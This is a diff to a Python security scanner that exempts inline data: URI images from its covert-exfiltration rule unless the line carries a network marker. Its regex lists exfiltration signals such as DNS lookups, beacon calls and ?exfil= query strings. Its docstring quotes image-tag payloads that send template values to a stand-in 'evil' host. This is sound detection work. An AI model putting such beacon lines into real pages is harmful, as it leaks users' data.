@@ -1308,6 +1308,49 @@ def _is_data_sanitization_intent(line: str, match: str) -> bool:
     return bool(_DATA_SANITIZE_INTENT_RE.search(line))
 
 
+# Issue #125 class 1 — the EXFIL_COVERT pattern ``img\s+src=.*\$\{`` fires on a
+# documented inline-image idiom ``<img src="data:image/png;base64,${IMG}">``. A
+# ``data:`` URI is a self-contained inline image embedded in the document; by
+# spec it performs NO network egress, so it cannot be a covert exfiltration
+# channel. EXFIL_COVERT is — by its own name — a covert CHANNEL rule and needs a
+# network sink (a remote URL, DNS, a beacon). The src must therefore be a
+# ``data:`` scheme AND the line must carry no network-bearing token.
+_IMG_SRC_DATA_URI_RE: Final[re.Pattern[str]] = re.compile(
+    r"""src\s*=\s*["']?\s*data:""",
+    re.IGNORECASE | re.VERBOSE,
+)
+# Any token on the line that means real egress — if present, the carve-out is
+# voided and the match keeps firing. Covers a remote URL scheme, a
+# protocol-relative ``//host`` src, DNS-lookup tools, a beacon API, and the
+# query-string exfil markers the EXFIL_COVERT catalog itself looks for.
+_EXFIL_NETWORK_TOKEN_RE: Final[re.Pattern[str]] = re.compile(
+    r"https?://"
+    r"|src\s*=\s*[\"']?\s*//"
+    r"|\bdns\b|\bnslookup\b|\bdig\b"
+    r"|sendBeacon|new\s+Image\s*\(\s*\)\s*\.\s*src"
+    r"|encodeURIComponent"
+    r"|\?data=|\?exfil=|\?d=",
+    re.IGNORECASE,
+)
+
+
+def _is_inert_data_uri_img(line: str, match: str) -> bool:
+    """True iff an EXFIL_COVERT ``img src`` match is a benign inline ``data:``
+    URI image (``<img src="data:image/png;base64,${IMG}">``).
+
+    A ``data:`` URI src embeds the image inline and performs no network egress,
+    so it is not a covert channel. Two FN guards: the line's ``img src`` must be
+    a ``data:`` scheme, AND the line must carry NO network-bearing token (a
+    remote URL, protocol-relative ``//`` src, DNS lookup, beacon API, or a
+    ``?data=`` / ``?exfil=`` exfil marker). A network-bearing src
+    (``<img src="https://evil/log?t=${T}">``, ``src="//evil/p?d=${X}">``) fails
+    the first or second guard and keeps firing.
+    """
+    if not _IMG_SRC_DATA_URI_RE.search(line):
+        return False
+    return not _EXFIL_NETWORK_TOKEN_RE.search(line)
+
+
 # r01 FP iter (2026-05-28) — emoji ZWJ combiner detection. U+200D between
 # two emoji / pictographic codepoints is a valid emoji ZWJ SEQUENCE (e.g.
 # ``❤‍🔥`` = heart + ZWJ + fire, ``👨‍💻`` = man + ZWJ + laptop,
@@ -2187,6 +2230,16 @@ def _certain_benign_literal(
         window = "\n".join(lines[lo : hi + 1])
         if not _MNEMONIC_CRYPTO_ADJ_RE.search(window) and not _CRYPTO_VOCAB_RE.search(window):
             return True
+
+    # (1b) Issue #125 class 1 — EXFIL_COVERT on a benign inline ``data:`` URI
+    #      image (``<img src="data:image/png;base64,${IMG}">``). A ``data:`` URI
+    #      embeds the image inline and performs NO network egress, so it is not a
+    #      covert channel. A network-bearing src (remote URL / protocol-relative
+    #      ``//`` / a ``?data=``/``?exfil=`` marker) fails the helper and keeps
+    #      firing — the DNS / beacon / encodeURIComponent EXFIL_COVERT siblings
+    #      are untouched.
+    if rule_id == "EXFIL_COVERT" and _is_inert_data_uri_img(line, match):
+        return True
 
     # (2) Benign reconnaissance command substitution ``$(whoami)`` with
     #     no network egress sink in context → the value cannot leave the
